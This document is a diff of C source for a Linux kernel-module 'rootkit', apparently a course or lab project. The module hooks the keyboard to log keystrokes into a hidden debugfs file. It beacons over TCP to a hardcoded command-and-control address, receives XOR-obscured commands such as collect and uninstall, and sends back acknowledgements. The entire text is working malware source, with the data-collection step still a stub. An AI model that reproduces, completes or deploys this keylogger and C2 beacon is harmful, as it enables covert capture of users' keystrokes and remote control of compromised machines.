@@ -29,18 +29,19 @@ static char * C2_IP = "192.168.56.1";
 struct socket *sock = NULL;
 static int CALLBACK_INTERVAL = 30;
 static int MAXIMUM_ATTEMPTS = 5;
-static enum data_operation {
-  SEND = 1,
-  RECV = 2
+static uint8_t encryption_key[] = {0xde, 0xad, 0xbe, 0xef};
+enum data_operation {
+    SEND = 1,
+    RECV = 2
+};
+enum commands {
+    COLLECT = 1,
+    UNINSTALL = 2,
+    DISCONNECT = 3
 };
 
-static int keylogFunc(struct notifier_block*, void*);
+static int keylogFunc(struct notifier_block*, unsigned long, void*);
 static ssize_t readKeys(struct file* fp, char* buffer, size_t len, loff_t* offset);
-
-const struct file_operations keyOps = {
-  .owner = THIS_MODULE,
-  .read = readKeys,
-};
 
 /*
 * readKeys: This function is the read for the file operations, it will read from the device created and write it to the file presented
@@ -50,11 +51,13 @@ const struct file_operations keyOps = {
 * @param loff_t offset: where to start in the buffer
 */
 static ssize_t readKeys(struct file* fp, char* buffer, size_t len, loff_t* offset){
-  return simple_read_from_buffer(buffer, len, offset, keysToWrite, bufSize);
+    return simple_read_from_buffer(buffer, len, offset, keysToWrite, bufSize);
 }
 
-static struct notifier_block keylogger = {
-    .notifier_call = keylogFunc
+
+const struct file_operations keyOps = {
+    .owner = THIS_MODULE,
+    .read = readKeys,
 };
 
 /*
@@ -63,7 +66,7 @@ static struct notifier_block keylogger = {
 * @param int keycode: the code of the key pressed
 * @param char* buffer: the buffer to hold the keys
 */
-void keycodeToAscii(int shift, int keycode, char* buf){
+static void keycodeToAscii(int shift, int keycode, char* buf){
     //keep track of the keys to be logged 
     if (keycode > KEY_RESERVED && keycode <= KEY_PAUSE){
       const char* asciiVal;
@@ -83,7 +86,7 @@ void keycodeToAscii(int shift, int keycode, char* buf){
 * @param: struct notifier_blk blk: The struct that holds the keylogging function
 * @param: void* _param: the struct that holds the keypress
 */
-int keylogFunc(struct notifier_block *blk, void *_param){
+static int keylogFunc(struct notifier_block *blk, unsigned long code, void *_param){
     struct keyboard_notifier_param *param = _param;
     char buf[MAX_KEY_LEN] = {0};
 
@@ -105,108 +108,149 @@ int keylogFunc(struct notifier_block *blk, void *_param){
     return NOTIFY_OK;
 }
 
-static uint8_t* encrypt(const uint8_t* msg, unsigned int msg_len, const uint8_t* key, unsigned int key_len) {
-  unsigned int i;
-  uint8_t* encrypted = (uint8_t*) kmalloc(msg_len + 1, GFP_KERNEL);
-  memset(encrypted, 0, msg_len + 1);
-  for (i = 0; i < msg_len; i++) {
-    encrypted[i] = msg[i] ^ key[i % key_len];
-  }
 
-  return encrypted;
+static struct notifier_block keylogger = {
+    .notifier_call = keylogFunc
+};
+
+static uint8_t* encrypt(const uint8_t* msg, unsigned int msg_len, const uint8_t* key, unsigned int key_len) {
+    unsigned int i;
+    uint8_t* encrypted = (uint8_t*) kmalloc(msg_len + 1, GFP_KERNEL);
+    memset(encrypted, 0, msg_len + 1);
+    for (i = 0; i < msg_len; i++) {
+        encrypted[i] = msg[i] ^ key[i % key_len];
+    }
+
+    return encrypted;
 }
 
-static int to_bytes(int num, uint8_t *ptr) {
-  int i;
-  for (i = 0; i < 4; i++) {
-    ptr[i] = (num >> (24 - (i * 8))) & 0xFF;
-  }
+static void to_bytes(int num, uint8_t *ptr) {
+    int i;
+    for (i = 0; i < 4; i++) {
+        ptr[i] = (num >> (24 - (i * 8))) & 0xFF;
+    }
 }
 
 static int do_data_transfer(char * buffer, size_t length, int operation) {
-  struct msghdr msg;
-  struct kvec vec;
-  // send code stub
-  msg.msg_name = 0;
-  msg.msg_namelen = 0;
-  msg.msg_control = NULL;
-  msg.msg_controllen = 0;
-  msg.msg_flags = 0;
+    struct msghdr msg;
+    struct kvec vec;
+    // send code stub
+    msg.msg_name = 0;
+    msg.msg_namelen = 0;
+    msg.msg_control = NULL;
+    msg.msg_controllen = 0;
+    msg.msg_flags = 0;
 
-  vec.iov_len = length;
-  vec.iov_base = buffer;
+    vec.iov_len = length;
+    vec.iov_base = buffer;
 
-  if (operation == SEND ){
-    return kernel_sendmsg(sock, &msg, &vec, 1, vec.iov_len);
-  } else if (operation == RECV) {
-    return kernel_recvmsg(sock, &msg, &vec, 1, vec.iov_len, 0);
-  } else {
-    return -1;
-  }
+    if (operation == SEND ){
+        return kernel_sendmsg(sock, &msg, &vec, 1, vec.iov_len);
+    } else if (operation == RECV) {
+        return kernel_recvmsg(sock, &msg, &vec, 1, vec.iov_len, 0);
+    } else {
+        return -1;
+    }
 }
 
 static int __init rootkit_init(void) {
-  int shutdown = 0, retval = -1, attempts = 0; 
+    int shutdown = 0, retval = -1, attempts = 0; 
+    uint8_t cmd_recv = 0;
+    uint8_t * crypto_ptr = NULL;
 
-  uint8_t cmd = 0;
+    struct sockaddr_in addr;
 
-  struct sockaddr_in addr;
+    addr.sin_family = AF_INET; 
+    addr.sin_addr.s_addr = in_aton(C2_IP); 
+    addr.sin_port = htons(C2_PORT);
 
-  addr.sin_family = AF_INET; 
-  addr.sin_addr.s_addr = in_aton(C2_IP); 
-  addr.sin_port = htons(C2_PORT);
+    printk(KERN_INFO "Loaded kernel module\n");
 
-  printk(KERN_INFO "Loaded kernel module\n");
+    //Create the directory and the file
+    subdir = debugfs_create_dir("447", NULL);
+    file = debugfs_create_file("kylg", 0400, subdir, NULL, &keyOps);
+    register_keyboard_notifier(&keylogger);
+    while (!shutdown) {
+        printk(KERN_INFO "Creating socket\n");
+        if (!sock && (retval = sock_create(PF_INET, SOCK_STREAM, IPPROTO_TCP, &sock)) < 0) {
+            printk(KERN_INFO "Failed to create socket, uninstalling now\n");
+            goto uninstall;
+        }
 
-  //Create the directory and the file
-  subdir = debugfs_create_dir("447", NULL);
-  file = debugfs_create_file("kylg", 0400, subdir, NULL, &keyOps);
-  register_keyboard_notifier(&keylogger);
+        // attempt to connect to socket, uninstall if attempts exceed MAXIMUM_ATTEMPTS
+        printk(KERN_INFO "Attempting to connect to C2\n");
+        while (0 != (retval = sock->ops->connect(sock, (struct sockaddr*) &addr, sizeof(addr), O_RDWR))) { 
+            printk("connection with the server failed with error code %i...\n", retval); 
+            ssleep(10);
+            attempts++;
+            if (attempts == MAXIMUM_ATTEMPTS) {
+                goto uninstall;
+            }
+        }
 
-  while (!shutdown) {
-    printk(KERN_INFO "Creating socket\n");
-    if (!sock && (retval = sock_create(PF_INET, SOCK_STREAM, IPPROTO_TCP, &sock)) < 0) {
-      printk(KERN_INFO "Failed to create socket, uninstalling now\n");
-      goto uninstall;
+        attempts = 0;
+
+        printk(KERN_INFO "Connection established!\n");
+        printk(KERN_INFO "Receiving command...\n");
+
+        if (0 > do_data_transfer(&cmd_recv, 1, RECV)) {
+            printk(KERN_INFO "Failed to receive command\n");
+            goto cleanup;
+        }
+
+        crypto_ptr = encrypt(&cmd_recv, 1, encryption_key, 4);
+        if (!crypto_ptr) {
+            printk(KERN_INFO "Failed to decrypt cmd\n");
+            goto cleanup;
+        }
+
+        if (0 > do_data_transfer(&cmd_recv, 1, SEND)) {
+            printk(KERN_INFO "Failed to ack command\n");
+            goto cleanup;
+        }
+
+        switch(*crypto_ptr) {
+            case COLLECT:
+                //TODO COLLECT FUNCTION
+                printk(KERN_INFO "Received command for collect\n");
+                break;
+
+            case UNINSTALL:
+                printk(KERN_INFO "Received command for uninstall\n");
+                shutdown = 1;
+                break;
+
+            case DISCONNECT:
+                printk(KERN_INFO "Received command for disconnect\n");
+                break;
+
+            default:
+                printk(KERN_INFO "Unknown command value: %u\n", *crypto_ptr);
+                break;
+        }
+        kfree(crypto_ptr);
+        crypto_ptr = NULL;
+        cmd_recv = 0;
+
+cleanup:
+        // cleanup current connection
+        printk(KERN_INFO "Destroying socket\n");
+        sock_release(sock);
+        sock = NULL;
+
+        // sleep until next callback
+        if (!shutdown) {
+            ssleep(CALLBACK_INTERVAL);
+        }
     }
-
-    // attempt to connect to socket, uninstall if attempts exceed MAXIMUM_ATTEMPTS
-    printk(KERN_INFO "Attempting to connect to C2\n");
-    while (0 != (retval = sock->ops->connect(sock, (struct sockaddr*) &addr, sizeof(addr), O_RDWR))) { 
-      printk("connection with the server failed with error code %i...\n", retval); 
-      ssleep(10);
-      attempts++;
-      if (attempts == MAXIMUM_ATTEMPTS) {
-        goto uninstall;
-      }
-    }
-
-    attempts = 0;
-    printk(KERN_INFO "Connection established!\n");
-
-    //char data[3] = {0x41, 0x42, 0x00};
-    //printk("SIZE SENT: %i\n", do_data_transfer(data, 3, SEND));
-
-    printk("SIZE RECV: %i\n", do_data_transfer(&cmd, 1, RECV));
-    printk("MSG RECV: %x\n", cmd);
-
-    // cleanup current connection
-    printk(KERN_INFO "Destroying socket\n");
-    sock_release(sock);
-    sock = NULL;
-
-    // sleep until next callback
-    ssleep(CALLBACK_INTERVAL);
-  }
-
 uninstall:
-  return retval;
+    return retval;
 }
 
 static void __exit rootkit_exit(void) {
-  printk(KERN_INFO "Removed kernel module\n");
-  debugfs_remove_recursive(subdir);
-  unregister_keyboard_notifier(&keylogger);
+    printk(KERN_INFO "Removed kernel module\n");
+    debugfs_remove_recursive(subdir);
+    unregister_keyboard_notifier(&keylogger);
 }
 
 module_init(rootkit_init);
